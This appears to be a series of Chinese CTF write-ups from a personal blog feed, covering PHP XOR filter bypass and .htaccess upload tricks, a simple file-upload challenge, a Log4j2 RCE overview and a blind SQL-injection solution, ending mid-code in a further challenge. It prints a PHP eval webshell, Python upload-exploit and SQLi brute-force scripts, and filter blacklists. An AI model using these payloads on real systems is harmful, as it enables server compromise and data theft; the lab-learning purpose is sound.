出现的字符不能超过12个</span></span><br></pre></td></tr></table></figure><p>我们先尝试绕过第二层判断，因为payload长度还没可知，18也挺长的</p><p><code>preg_match</code>的绕过在这里能想到的只有通过异或绕过（只有<code>^</code>没有被过滤，<code>~|</code>都被过滤）</p><p>关于异或绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php的eval()函数在执行时如果内部有类似&quot;abc&quot;^&quot;def&quot;的计算式，那么就先进行计算再执行。例如url?a=&#123;_GET&#125;&#123;b&#125;();&amp;b=phpinfo,也就是?a=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo,在传入后实际上为$&#123;????^????&#125;&#123;?&#125;();但是到了eval()函数内部就会变成$&#123;_GET&#125;&#123;?&#125;();成功执行。</span><br></pre></td></tr></table></figure><p>引用<a href="https://www.cnblogs.com/cimuhuashuimu/p/11546422.html">Hanamizuki花水木php异或计算绕过preg_match()</a></p><blockquote><p><strong>绕过原理</strong><br><strong>以制作免杀马为例:</strong><br>  在制作免杀马的过程，根据php的语言特性对字符进行!运算会将字符类型转为bool类型,而bool类型遇到运算符号时,true会自动转为数字1,false会自动转为数字0,如果将bool类型进行计算,并使用chr()函数转为字符,使用”.”进行连接,便可以绕过preg_match匹配。<br>详情了解php不同于其他语言部分<br>  但是很多的preg_match会过滤掉”.”,所以需要使用异或运算进行绕过,很多的免杀马都是这样制作的。php对字符进行异或运算是先将字符转换成ASCII码然后进行异或运算,并且php能直接对一串字符串进行异或运算,例如”123”^”abc”是”1”与”a”进行异或然后”2”与”b”进行异或,以此类推,在异或结束后就获得了想要的字符串。<br>  注意点:进行异或运算时要将数字转换成字符形式,如果数字(int)和字符异或的话,结果只会是数字,例如1^”a”=1,”a”^2=2,将数字转换成字符串可以使用trim()函数。<br>拓展:<br>php特性use of undefined constant,会将没有引号的字符都自动视为字符串,ASCII码大于0x7F的都会被当作字符串,由此可知可以简化异或过程,任何字符与0xff异或都会取相反,这样就能减少运算量了。</p></blockquote><p>从而我们构造出payload（长度刚好为18）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://de749e14-6125-4f51-9343-53a47bfa635e.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></pre></td></tr></table></figure><p>![image-20211211200216819]([SUCTF 2019]EasyWeb/202112112217485.png)</p><p>先查看一下<code>disable_functions</code>，发现ban了很多命令执行函数<code>system、exec</code>等</p><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>这里我尝试搜了一下<code>flag</code>，没想到直接就给搜出来了</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112112217487.png" alt="image-20211211200353334"></p><p>但是细想题目刚开始给了一个<code>get_the_flag</code>函数没有用的，出于对知识的渴望，就尝试使用其他方式解题</p><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>我们通过以上payload执行了<code>phpinfo()</code>，同理我们必然可以执行<code>get_the_flag</code>函数，来让我们看一看如何利用这个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = substr(<span class="variable">$name</span>, strrpos(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        print_r(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里需要绕过以下：</p><blockquote><p>文件扩展名不能有<code>ph</code></p><p><code>mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)</code>文件内容不能有<code>&lt;?</code></p><p><code>exif_imagetype()</code>判断文件头字节是否为图片类型</p></blockquote><h3 id="利用-htaccess上传文件"><a href="#利用-htaccess上传文件" class="headerlink" title="利用.htaccess上传文件"></a>利用.htaccess上传文件</h3><p>通过刚才的分析可以得知，过滤了<code>ph</code>，既不能使用<code>伪协议</code>也不能传入扩展名为<code>php</code>等php文件，第二次过滤了<code>&lt;?</code>，看别的师傅的WP说php7以上不可以使用<code>&lt;script&gt;</code>，所以只能利用<code>.htaccess</code>上传任意扩展文件达成攻击目的。</p><p>先上传最重要的<code>.htaccess</code>文件了</p><p>自己觉得挺全的学习路径：<a href="https://xz.aliyun.com/t/8267">Apache的.htaccess利用技巧</a></p><p>.htaccess</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./1.jpg&quot;</span><br></pre></td></tr></table></figure><p>通过刚才的链接学习到</p><blockquote><p>AddType application/x-httpd-php .jpg  # 将.jpg以php的方式解析<br>php_value auto_append_file  “php://filter/convert.base64-decode/resource=./1.jpg”<br>#在1.jpg加载完毕后，再次包含base64解码后的1.jpg，成功getshell，所以这也就是为什么会出现两次1.jpg内容的原因，第一次是没有经过base64解密的，第二次是经过解密并且转化为php了的。</p></blockquote><p>还有一点要注意的是，如何绕过图片验证限制，一共有两种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">直接在文件头加入以下：</span><br><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">或者以16进制形式在文件头加入：</span><br><span class="line">\x00</span><br></pre></td></tr></table></figure><p>原理：#注释和\x00会将这行作为无效行解析</p><p>接下来上传图片马</p><p>这里传图片马非常要注意的一点是<strong>总字节长度必须是4的倍数（保证base64解码成功）</strong>，这里被坑想了好久</p><p>1.jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF98abbPD9waHAgZXZhbCgkX0dFVFsnY21kJ10pOz8+</span><br></pre></td></tr></table></figure><p>上面内容中<code>bb</code>就是为了凑长度的（这里千万不要换行，虽然换行符也占字节，但是实测没有效果，大概是因为不是可读字符吧）</p><p>然后依次传入文件，直接访问传入的图片马就可以了</p><p>这里再挂一个大佬的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c387b4f3-e235-43cf-9af6-cbecb55f023c.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">padding = <span class="string">&quot;?_=$&#123;%f8%f8%f8%f8^%a7%bf%bd%ac&#125;&#123;%f8&#125;();&amp;%f8=get_the_flag&quot;</span></span><br><span class="line">myip = requests.get(<span class="string">&quot;http://ifconfig.me&quot;</span>).text</span><br><span class="line">ip_md5 = hashlib.md5(myip.encode()).hexdigest()</span><br><span class="line">userdir = <span class="string">&quot;upload/tmp_&quot;</span> + ip_md5 + <span class="string">&quot;/&quot;</span></span><br><span class="line">htaccess = <span class="string">b&quot;&quot;&quot;\x00</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .jpg</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shaw.jpg&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shaw = <span class="string">b&quot;\x00\x00\x8a\x39\x8a\x39&quot;</span> + <span class="string">b&quot;aa&quot;</span> + base64.b64encode(</span><br><span class="line">    <span class="string">b&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]);?&gt;&quot;</span>)  <span class="comment"># 00为了满足base64算法凑足八个字节</span></span><br><span class="line"><span class="built_in">print</span>(shaw)</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">&#x27;file&#x27;</span>, (<span class="string">&#x27;.htaccess&#x27;</span>, htaccess, <span class="string">&#x27;image/jpeg&#x27;</span>))]</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url + padding, files=files)</span><br><span class="line">files = [(<span class="string">&#x27;file&#x27;</span>, (<span class="string">&#x27;1.jpg&#x27;</span>, shaw, <span class="string">&#x27;image/jpeg&#x27;</span>))]</span><br><span class="line">res = requests.post(url=url + padding, files=files)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the path is:&quot;</span> + url + res.text)</span><br></pre></td></tr></table></figure><p>emm….，结果发现最终还是在<code>phpinfo</code>中找flag</p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> .htaccess </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUSTCTF2020 CV Maker</title>
      <link href="/post/2021-12/%5BWUSTCTF2020%5DCV%20Maker/"/>
      <url>/post/2021-12/%5BWUSTCTF2020%5DCV%20Maker/</url>
      
        <content type="html"><![CDATA[<h1 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h1><p><strong>考点：文件上传 bypass</strong></p><p>进入题目，一个看着非常复杂得页面</p><p>![image-20211211185811224]([WUSTCTF2020]CV Maker/202112112217389.png)</p><p>通过瞎点一通或者通过查看源码，发现就只有<code>注册</code>和<code>登录</code>功能是可以用的，所以先来注册一个账号登录进去。</p><p>登录成功后发现可以上传文件，通过测试猜测是通过<code>文件头信息</code>进行过滤的，其余没有任何过滤，所以先上传一个<code>phpinfo</code></p><p>![image-20211211190319978]([WUSTCTF2020]CV Maker/202112112217390.png)</p><p>在上传成功后，在源码中很容易得就能找到上传路径</p><p>![image-20211211190404663]([WUSTCTF2020]CV Maker/202112112217391.png)</p><p>然后打开文件，查看<code>disable_functions</code></p><p>![image-20211211190434492]([WUSTCTF2020]CV Maker/202112112217392.png)</p><p>没有ban掉任何一个函数，就是一个很简单文件上传漏洞，直接传php一句话木马，在根目录发现<code>flag</code></p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112112217393.png" alt="image-20211211190551927"></p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Log4j2 RCE漏洞复现</title>
      <link href="/post/2021-12/Apache%20Log4j2%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/post/2021-12/Apache%20Log4j2%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p> 看我看我，有没有大佬悄咪咪的给我个exp打自己过过瘾</p></blockquote><p>![image-20211210164553234](Apache Log4j2 RCE漏洞复现/202112101705180.png)</p><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。 </p><p>在大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。</p><p><strong>该漏洞危害等级：严重</strong></p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><table><thead><tr><th><strong>Log4j版本</strong></th><th><strong>是否受影响</strong></th></tr></thead><tbody><tr><td>2.x&lt;=2.14.1</td><td>是</td></tr><tr><td>2.15.0-rc1</td><td>是</td></tr><tr><td>2.15.0-rc2</td><td>否</td></tr></tbody></table><p>已知影响组件：</p><ul><li>Apache Struts2</li><li>Apache Solr</li><li>Apache Flink</li><li>Apache Druid</li><li>ElasticSearch</li><li>flume</li><li>dubbo</li><li>Redis</li><li>logstash</li><li>kafka</li></ul><h2 id="当前漏洞状态"><a href="#当前漏洞状态" class="headerlink" title="当前漏洞状态"></a>当前漏洞状态</h2><table><thead><tr><th>细节是否公开</th><th>PoC状态</th><th>EXP状态</th><th>在野利用</th></tr></thead><tbody><tr><td><strong>已公开</strong></td><td><strong>已公开</strong></td><td><strong>已公开</strong></td><td><strong>已发现</strong></td></tr></tbody></table><h2 id="攻击检测"><a href="#攻击检测" class="headerlink" title="攻击检测"></a>攻击检测</h2><p>可以通过检查日志中是否存在“jndi:ldap://”、“jndi:rmi”等字符来发现可能的攻击行为。</p><h2 id="漏洞排查"><a href="#漏洞排查" class="headerlink" title="漏洞排查"></a>漏洞排查</h2><p>代码排查：查看 pom.xml 是否引入 org.apache.logging.log4j、org.apache.logging.log4j2 </p><p>Linux：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find / -name &quot;*log4j-*.jar&quot;</span><br></pre></td></tr></table></figure><p>Windows：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*log4j*.jar</span><br></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="Vulfocus-靶场环境"><a href="#Vulfocus-靶场环境" class="headerlink" title="Vulfocus 靶场环境"></a>Vulfocus 靶场环境</h2><p>目前 Vulfocus 已经集成 Log4j2 环境，可通过以下链接启动环境测试：</p><p><a href="http://vulfocus.fofa.so/#/dashboard?image_id=3b8f15eb-7bd9-49b2-a69e-541f89c4216c">http://vulfocus.fofa.so/#/dashboard?image_id=3b8f15eb-7bd9-49b2-a69e-541f89c4216c</a></p><p>也可通过 docker pull vulfocus/log4j2-rce-2021-12-09:latest 拉取本地环境运行，本地启动命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -P vulfocus/log4j2-rce-2021-12-09:latest</span><br></pre></td></tr></table></figure><p>![image-20211210165957575](Apache Log4j2 RCE漏洞复现/202112101924822.png)</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.secrss.com/articles/36995">https://www.secrss.com/articles/36995</a></p><p><a href="https://nosec.org/home/detail/4917.html">https://nosec.org/home/detail/4917.html</a></p><p><a href="https://github.com/apache/logging-log4j2">https://github.com/apache/logging-log4j2</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> apache </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2019 SQLi</title>
      <link href="/post/2021-12/%5BNCTF2019%5DSQLi/"/>
      <url>/post/2021-12/%5BNCTF2019%5DSQLi/</url>
      
        <content type="html"><![CDATA[<h1 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h1><p><strong>考点：sql bypass</strong></p><p>一道sql题，非常友好的给出了<code>sqlquery</code>，但想必也不简单</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlquery : <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure><p>这中语句非常典型，不试都能猜到必然过滤了<code>&#39;</code>，在<code>username</code>处使用<code>\</code>转义，语句就变成了这样：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlquery : <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure><p>但不幸的是我们使用传统的<code>--+</code>和<code>#</code>并没有办法注释掉最后的那个单引号，所以我们可以用<code>%00</code>的实际值（%00的urldecode）来截断最后的单引号。</p><p>因为BUU的429限制，跑字典非常的耗时，所以就随便写了个小字典跑了一下</p><p><img src="/post/2021-12/[NCTF2019]SQLi/202112101546101.png" alt="image-20211209223445980"></p><p>发现过滤了<code>空格、like、=、and、or</code>一些字段，还好还有些可以用的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">like</span> <span class="operator">=</span><span class="operator">&gt;</span> regexp</span><br><span class="line">空格 <span class="operator">=</span><span class="operator">&gt;</span> <span class="comment">/**/</span></span><br><span class="line"><span class="keyword">or</span> <span class="operator">=</span><span class="operator">&gt;</span> <span class="operator">||</span></span><br></pre></td></tr></table></figure><p>猜测这题应该就是爆破密码，我们先构造一下payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;||1/**/regexp/**/&quot;1&quot;;%00&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/post/2021-12/[NCTF2019]SQLi/202112101546103.png" alt="image-20211209223918441"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;||1/**/regexp/**/&quot;2&quot;;%00&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/post/2021-12/[NCTF2019]SQLi/202112101546104.png" alt="image-20211209224004838"></p><p>得到两个的返回页面，证实了<code>payload</code>的可行性，开始编写<code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://968b8b9f-ecd5-47dd-8638-c3eeb5519d0b.node4.buuoj.cn:81//index.php&quot;</span></span><br><span class="line">string = string.ascii_lowercase + string.digits + <span class="string">&#x27;_&#x27;</span>  <span class="comment"># 猜测密码由字母 数字 下划线组成</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:</span><br><span class="line">            <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>:</span><br><span class="line">            <span class="string">&quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                flag + j, parse.unquote(<span class="string">&quot;%00&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">while</span> (r.status_code == <span class="number">429</span>):  <span class="comment"># 避免访问次数过快产生429从而终止脚本</span></span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;welcome&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;_&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;welcome&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:  <span class="comment"># 终止条件</span></span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>有的小伙伴就会问了，我的<code>string</code>变量中并未加入大写字母诶，sql语句对大小写不敏感所以无需区分大小写。</p><p><img src="/post/2021-12/[NCTF2019]SQLi/202112101546105.png" alt="image-20211210153816963"></p><p>还有一个要注意的是，<code>%00</code>需要urldecode加入才有用，不然不能起到截断的作用。</p><p><img src="/post/2021-12/[NCTF2019]SQLi/202112101546106.png" alt="image-20211210153908825"></p><p>密码爆出来后，随便使用一个用户名登陆就可以获得<code>flag</code>了，这里将<code>admin</code>给过滤掉了。</p><p>经过看其他师傅的wp，发现通过<code>dirsearch</code>扫描出了<code>robots.txt</code>和<code>hint.txt</code>，提示如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> bypass </tag>
            
            <tag> sqli </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HarekazeCTF2019 encode_and_encode</title>
      <link href="/post/2021-12/%5BHarekazeCTF2019%5Dencode_and_encode/"/>
      <url>/post/2021-12/%5BHarekazeCTF2019%5Dencode_and_encode/</url>
      
        <content type="html"><![CDATA[<h1 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h1><p><strong>考点：json_decode的unicode编码绕过</strong></p><p>进入题目后，很容易就可以看到源码<code>query.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">&#x27;\.\.&#x27;</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$body</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$json</span> = json_decode(<span class="variable">$body</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid(<span class="variable">$body</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$json</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$page</span> = <span 